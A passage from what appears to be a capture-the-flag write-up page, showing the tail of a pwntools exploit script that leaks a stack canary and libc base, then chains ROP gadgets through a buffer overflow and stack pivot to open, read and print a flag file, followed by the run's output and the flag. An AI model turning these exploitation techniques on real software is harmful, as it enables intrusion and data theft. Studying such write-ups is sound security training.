</span></span><span style=display:flex><span>main_fn_addr <span style=color:#f92672>=</span> u64(result[<span style=color:#ae81ff>11</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>11</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>])
</span></span><span style=display:flex><span>code_segment_base <span style=color:#f92672>=</span> main_fn_addr <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x331</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Canary = </span><span style=color:#e6db74>{</span>hex(canary)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libc start main base = </span><span style=color:#e6db74>{</span>hex(libc_start_main)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libc base addr = </span><span style=color:#e6db74>{</span>hex(libc_base_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Main Function Address = </span><span style=color:#e6db74>{</span>hex(main_fn_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Code Segment = </span><span style=color:#e6db74>{</span>hex(code_segment_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Prepare ROP gadget</span>
</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#f92672>=</span> libc_base_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x0000000000045eb0</span><span style=color:#75715e># : pop rax ; ret</span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> libc_base_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x000000000002a3e5</span><span style=color:#75715e># : pop rdi ; ret</span>
</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#f92672>=</span> libc_base_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x000000000002be51</span><span style=color:#75715e># : pop rsi ; ret</span>
</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#f92672>=</span> libc_base_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x00000000000796a2</span><span style=color:#75715e># : pop rdx ; ret</span>
</span></span><span style=display:flex><span>pop_rdx_rbx_ret <span style=color:#f92672>=</span> libc_base_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x0000000000090529</span><span style=color:#75715e># : pop rdx ; pop rbx ; ret</span>
</span></span><span style=display:flex><span>syscall_ret <span style=color:#f92672>=</span> libc_base_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x0000000000091396</span><span style=color:#75715e># : syscall ; ret</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bss_addr <span style=color:#f92672>=</span> code_segment_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3000</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x200</span>
</span></span><span style=display:flex><span>bss_addr_flag <span style=color:#f92672>=</span> bss_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x400</span>
</span></span><span style=display:flex><span>bss_addr_buf <span style=color:#f92672>=</span> bss_addr_flag <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x120</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>file_addr <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/home/chal/flag.txt&#39;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x38</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>trash_payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    canary,
</span></span><span style=display:flex><span>    bss_addr,
</span></span><span style=display:flex><span>    main_fn_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>291</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>extend_payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    canary,
</span></span><span style=display:flex><span>    bss_addr_flag,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>400</span>,
</span></span><span style=display:flex><span>    main_fn_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>298</span>,
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>open_payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Open file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fd = open(&#34;/home/chal/flag.txt&#34;, 0);</span>
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, bss_addr_flag <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x40</span>,
</span></span><span style=display:flex><span>    pop_rdx_rbx_ret, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rsi_ret, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    syscall_ret
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>read_payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Read the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># read(fd, buf, 0x30);</span>
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>3</span>, 
</span></span><span style=display:flex><span>    pop_rsi_ret, bss_addr_buf,
</span></span><span style=display:flex><span>    pop_rdx_rbx_ret, <span style=color:#ae81ff>0x70</span>, <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    syscall_ret
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>write_payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># Write the file</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># write(1, buf, 0x30);</span>
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    pop_rdi_ret, <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    <span style=color:#75715e># pop_rsi_ret, bss_addr_buf,</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># pop_rdx_ret, 0x70,</span>
</span></span><span style=display:flex><span>    syscall_ret
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Extend rbp space</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x38</span> <span style=color:#f92672>+</span> trash_payload)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x38</span> <span style=color:#f92672>+</span> extend_payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Write Exploit ROP gadget</span>
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(file_addr <span style=color:#f92672>+</span> p64(canary) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> open_payload <span style=color:#f92672>+</span> read_payload <span style=color:#f92672>+</span> write_payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python exp.py
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;./chal&#39;</span>: pid <span style=color:#ae81ff>5857</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to 10.113.184.121 on port 10056: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>b<span style=color:#e6db74>&#39;aaaaaaaaaaaaaaaaaaaa hachamachama&#39;</span>, b<span style=color:#e6db74>&#39;ECHO HACHAMA!&#39;</span><span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-------------Stack Info-------------<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x414d4148434148
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x2be6a8b7acfcbc00
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x1
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x7fef436ccd90
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 0x560ff1bf4331
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-------------Stack Info-------------<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Canary <span style=color:#f92672>=</span> 0x2be6a8b7acfcbc00
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> libc start main base <span style=color:#f92672>=</span> 0x7fef436ccd10
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> libc base addr <span style=color:#f92672>=</span> 0x7fef436a3000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Main Function Address <span style=color:#f92672>=</span> 0x560ff1bf4331
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Code Segment <span style=color:#f92672>=</span> 0x560ff1bf4000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>https://www.youtube.com/watch?v<span style=color:#f92672>=</span>qbEdlmzQftE&amp;list<span style=color:#f92672>=</span>PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT&amp;index<span style=color:#f92672>=</span>1<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00Segmentation fault
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Got EOF <span style=color:#66d9ef>while</span> reading in interactive
</span></span><span style=display:flex><span>$
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Interrupted
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Closed connection to 10.113.184.121 port <span style=color:#ae81ff>10056</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stopped process <span style=color:#e6db74>&#39;./chal&#39;</span> <span style=color:#f92672>(</span>pid 5857<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Flag: <code>flag{https://www.youtube.com/watch?v=qbEdlmzQftE&amp;list=PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT&amp;index=1}</code></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---bof--stack-pivot--rop>Exploit - BOF + Stack Pivot + ROP</a></li></ul></nav></div></aside></main></body></html>